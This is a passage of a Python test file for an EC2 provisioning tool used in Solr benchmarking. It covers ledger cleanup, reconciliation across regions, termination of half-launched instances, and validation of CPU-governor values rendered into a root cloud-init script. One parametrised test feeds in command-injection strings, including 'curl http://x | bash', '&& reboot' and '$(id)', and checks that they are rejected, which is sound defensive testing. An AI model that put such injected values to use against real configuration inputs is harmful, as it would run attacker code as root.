        # A run's own finally block and a later reconciliation can both reach
        # the same stack; the second must be a no-op, not a warning about an
        # immutable write.
        ledger.record_provisioned(storage, "s-1", {"region": "eu-north-1"})
        ledger.record_released(storage, "s-1", {"reason": "first"})
        ledger.record_released(storage, "s-1", {"reason": "second"})
        assert ledger.leaked(storage) == []

    def test_an_unreachable_region_does_not_stop_the_others(self, storage, monkeypatch):
        def client(service, *, region, profile=None):
            if region == "broken":
                raise RuntimeError("no credentials")
            return StubEc2(instances={})

        monkeypatch.setattr(reclaim.aws, "client", client)
        result = reclaim.reconcile(storage, regions=["broken", "eu-north-1"])
        assert any("broken" in note for note in result.skipped)
        assert "eu-north-1" in result.regions


class TestHalfBuiltStacksAreNotLeft:
    """The expensive failure: instances billing with nothing to drive them."""

    def test_solr_nodes_are_terminated_when_the_driver_cannot_be_launched(self, monkeypatch,
                                                                          tmp_path):
        # The Solr nodes launch, then the driver's run_instances raises -- no
        # capacity for its type, an instance limit, any transient API error.
        # Those nodes are running and billing, and nothing else will reclaim
        # them: the ledger entry is closed on the way out, so a later
        # ledger-based teardown will not see this stack as a leak either.
        from solrorbit.tools.launchr.provisioning import ec2 as mod

        ec2 = StubEc2()
        launched: list[str] = []
        real_run = aws.run_instances

        def run_instances(client, **kwargs):
            if kwargs.get("role") == "driver":
                raise RuntimeError("InsufficientInstanceCapacity")
            ids = real_run(client, **kwargs)
            launched.extend(ids)
            return ids

        monkeypatch.setattr(aws, "run_instances", run_instances)
        monkeypatch.setattr(mod.aws, "run_instances", run_instances)
        monkeypatch.setattr(mod.aws, "client", lambda *a, **k: ec2)

        strategy = Ec2Provisioning(storage=LocalStorageBackend(tmp_path / "s"))
        profile = ProfileSpec(name="p", provisioning="ec2", install_method="docker-ssh",
                              nodes=2, options={"region": "eu-north-1"})
        with pytest.raises(Exception, match="InsufficientInstanceCapacity"):
            strategy.provision(profile, nodes=2)

        assert launched, "the Solr nodes should have been launched"
        assert sorted(ec2.terminated) == sorted(launched), (
            f"launched {launched} but terminated {ec2.terminated}"
        )


class TestHostTuningValues:
    """``host_tuning`` is rendered into a script cloud-init runs as root."""

    def test_a_known_governor_is_rendered(self):
        assert "echo performance" in _render_host_tuning({"cpu_governor": "performance"})

    @pytest.mark.parametrize("value", [
        "performance; curl http://x | bash",
        "performance && reboot",
        "$(id)",
        "turbo",
    ])
    def test_anything_else_is_a_config_error(self, value):
        # Validated rather than quoted: the only safe values are governor
        # names, and a typo should fail closed like its siblings do.
        with pytest.raises(ConfigError, match="cpu_governor"):
            _render_host_tuning({"cpu_governor": value})

    def test_its_siblings_still_fail_closed(self):
        with pytest.raises(ConfigError, match="transparent_hugepages"):
            _render_host_tuning({"transparent_hugepages": "sometimes"})
